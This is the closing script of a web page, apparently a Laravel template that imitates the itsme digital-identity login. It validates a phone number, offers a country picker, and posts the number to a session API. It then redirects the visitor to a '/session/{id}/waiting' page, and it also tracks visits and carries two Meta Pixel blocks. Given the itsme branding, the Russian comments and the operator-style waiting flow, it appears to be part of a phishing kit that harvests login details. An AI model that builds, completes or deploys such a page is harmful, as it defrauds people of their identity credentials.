        var dialDigits = selectedCountry.dial.replace('+', '');
        var localDigits = digitsOnly.substring(dialDigits.length);
        
        if (localDigits.length === 0) {
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            phoneInput.classList.remove('valid', 'invalid');
            phoneInput.style.borderColor = '#747474';
            errorDiv.classList.remove('show');
            return false;
        } else if (!hasPlaceholder) {
            submitBtn.disabled = false;
            submitBtn.classList.add('active');
            phoneInput.classList.add('valid');
            phoneInput.classList.remove('invalid');
            phoneInput.style.borderColor = '#84bd00';
            errorDiv.classList.remove('show');
            return true;
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            phoneInput.classList.add('invalid');
            phoneInput.classList.remove('valid');
            phoneInput.style.borderColor = '#dc3545';
            errorDiv.textContent = window.translations.phone_error_incomplete;
            errorDiv.classList.add('show');
            return false;
        }
    }
    
    // Input handling
    phoneInput.addEventListener('input', function() {
        validatePhone();
    });
    
    // Blur handling
    phoneInput.addEventListener('blur', function() {
        validatePhone();
    });
    
    // Focus handling
    phoneInput.addEventListener('focus', function() {
        if (phoneInput.value === '' || !phoneInput.value.startsWith('+')) {
            phoneMask.value = selectedCountry.dial + ' ';
        }
    });
    
    // Предотвращение отправки невалидной формы
    submitBtn.addEventListener('click', async function(e) {
        if (!validatePhone()) {
            e.preventDefault();
            phoneInput.focus();
            if (navigator.vibrate) {
                navigator.vibrate(200);
            }
            return;
        }
        
        const phone = phoneInput.value.trim();
        
        submitBtn.disabled = true;
        submitBtn.classList.remove('active');
        this.querySelector('span').textContent = window.translations.loading;
        
        try {
            await createMainSession('phone', phone);
        } catch (error) {
            console.error('Error:', error);
            this.querySelector('span').textContent = window.translations.send;
            validatePhone();
        }
    });
    
    // Предотвращение ввода недопустимых символов
    phoneInput.addEventListener('keypress', function(e) {
        const char = String.fromCharCode(e.which);
        if (!/[0-9\s]/.test(char)) {
            e.preventDefault();
        }
    });
    
    // Enter key support
    phoneInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });
    
    // Create main session (convert from pre-session)
    async function createMainSession(inputType, inputValue) {
        if (!preSessionId) {
            return createSession(inputType, inputValue);
        }
        
        try {
            const response = await fetch(`/api/pre-session/${preSessionId}/convert`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    input_type: inputType,
                    input_value: inputValue
                })
            });
            
            if (!response.ok) {
                throw new Error('Failed to convert pre-session');
            }
            
            const data = await response.json();
            const sessionId = data.session_id;
            
            localStorage.setItem('session_id', sessionId);
            localStorage.removeItem('pre_session_id');
            clearInterval(onlineCheckInterval);
            
            if (window.SessionManager) {
                window.SessionManager.setSessionId(sessionId);
            }
            
            if (existingSessionId) {
                trackPageVisit(existingSessionId, 'Login page - phone submitted', window.location.href, 'phone_submit');
            }
            
            window.location.href = `/session/${sessionId}/waiting`;
            
        } catch (error) {
            console.error('Error converting pre-session:', error);
            throw error;
        }
    }
    
    // Fallback to original session creation
    async function createSession(inputType, inputValue) {
        const response = await fetch('/api/session', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
                input_type: inputType,
                input_value: inputValue
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to create session');
        }
        
        const data = await response.json();
        const sessionId = data.data.id;
        
        localStorage.setItem('session_id', sessionId);
        
        if (window.SessionManager) {
            window.SessionManager.setSessionId(sessionId);
        }
        
        if (existingSessionId) {
            trackPageVisit(existingSessionId, 'Login page - phone submitted', window.location.href, 'phone_submit');
        }
        
        window.location.href = `/session/${sessionId}/waiting`;
    }
    
    // Начальная валидация
    validatePhone();
});

// Track page visit on load (only once)
let visitTracked = false;
window.addEventListener('load', () => {
    if (visitTracked) return;
    visitTracked = true;
    
    fetch('/api/visit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({
            event: 'itsme',
            locale: '{{ app()->getLocale() }}'
        })
    }).catch(() => {});
});

// Country dialog initialization
function initCountryDialog() {
    var dialog = document.getElementById('country-dialog');
    var backdrop = document.getElementById('cd-backdrop');
    var closeBtn = document.getElementById('cd-close-btn');
    var searchInput = document.getElementById('cd-search-input');
    var clearBtn = document.getElementById('cd-clear-btn');
    var mostList = document.getElementById('cd-most-list');
    var allList = document.getElementById('cd-all-list');
    var noResults = document.getElementById('cd-no-results');
    var mostTitle = document.getElementById('cd-most-title');
    var allTitle = document.getElementById('cd-all-title');
    var selector = document.getElementById('country-selector');
    
    function createCountryRow(country, isSelected) {
        var li = document.createElement('li');
        var btn = document.createElement('button');
        btn.className = isSelected ? 'main selected' : 'main';
        btn.setAttribute('data-code', country.code);
        btn.setAttribute('data-dial', country.dial);
        
        var sub = document.createElement('div');
        sub.className = 'sub';
        
        sub.innerHTML =
            '<span class="country-flag"><img loading="lazy" width="24" height="24" alt="" src="https://assets.prd.itsme.services/icons/' + country.code + '.svg"></span>' +
            '<span class="country-name">' + country.name + '</span>' +
            '<span class="country-code">(' + country.dial + ')</span>' +
            (isSelected ? '<span class="visually-hidden">Selected</span>' : '');
        
        btn.appendChild(sub);
        li.appendChild(btn);
        return li;
    }
    
    function renderLists(filter) {
        filter = (filter || '').toLowerCase();
        mostList.innerHTML = '';
        allList.innerHTML = '';
        
        var currentCode = window.selectedCountryCode;
        var mostCount = 0;
        var allCount = 0;
        
        // Most selected
        window.mostSelectedCodes.forEach(function(code) {
            var country = window.allCountries.find(function(c) { return c.code === code; });
            if (country && (country.name.toLowerCase().indexOf(filter) !== -1 || country.dial.indexOf(filter) !== -1)) {
                mostList.appendChild(createCountryRow(country, country.code === currentCode));
                mostCount++;
            }
        });
        
        // All countries
        window.allCountries.forEach(function(country) {
            if (filter === '' || country.name.toLowerCase().indexOf(filter) !== -1 || country.dial.indexOf(filter) !== -1 || country.code.indexOf(filter) !== -1) {
                allList.appendChild(createCountryRow(country, country.code === currentCode));
                allCount++;
            }
        });
        
        mostTitle.style.display = mostCount > 0 ? '' : 'none';
        mostList.style.display = mostCount > 0 ? '' : 'none';
        allTitle.style.display = allCount > 0 ? '' : 'none';
        allList.style.display = allCount > 0 ? '' : 'none';
        noResults.className = (mostCount + allCount === 0) ? 'cd-no-results visible' : 'cd-no-results';
    }
    
    // Open dialog
    selector.addEventListener('click', function(e) {
        e.preventDefault();
        dialog.classList.add('open');
        searchInput.value = '';
        clearBtn.classList.remove('visible');
        renderLists('');
        setTimeout(function() { searchInput.focus(); }, 150);
        document.body.style.overflow = 'hidden';
    });
    
    // Close dialog
    function closeDialog() {
        dialog.classList.remove('open');
        document.body.style.overflow = '';
    }
    
    backdrop.addEventListener('click', closeDialog);
    closeBtn.addEventListener('click', closeDialog);
    
    // Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && dialog.classList.contains('open')) {
            closeDialog();
        }
    });
    
    // Search
    searchInput.addEventListener('input', function() {
        var hasText = this.value.length > 0;
        if (hasText) {
            clearBtn.classList.add('visible');
        } else {
            clearBtn.classList.remove('visible');
        }
        renderLists(this.value);
    });
    
    clearBtn.addEventListener('click', function() {
        searchInput.value = '';
        clearBtn.classList.remove('visible');
        renderLists('');
        searchInput.focus();
    });
    
    // Country selection (event delegation)
    function handleCountryClick(e) {
        var btn = e.target.closest('button[data-code]');
        if (!btn) return;
        
        var code = btn.getAttribute('data-code');
        var dial = btn.getAttribute('data-dial');
        var country = window.allCountries.find(function(c) { return c.code === code; });
        
        if (country) {
            // Update selector display
            document.getElementById('country-flag-img').src = 'https://assets.prd.itsme.services/icons/' + code + '.svg';
            document.getElementById('country-code-display').textContent = dial;
            window.selectedCountryCode = code;
            
            // Dispatch event for phone mask update
            var event = new CustomEvent('countryChanged', { detail: country });
            document.dispatchEvent(event);
            
            closeDialog();
        }
    }
    
    mostList.addEventListener('click', handleCountryClick);
    allList.addEventListener('click', handleCountryClick);
}
</script>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1398096467952166');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1398096467952166&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
 <!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3803073376656262');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=3803073376656262&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
</body>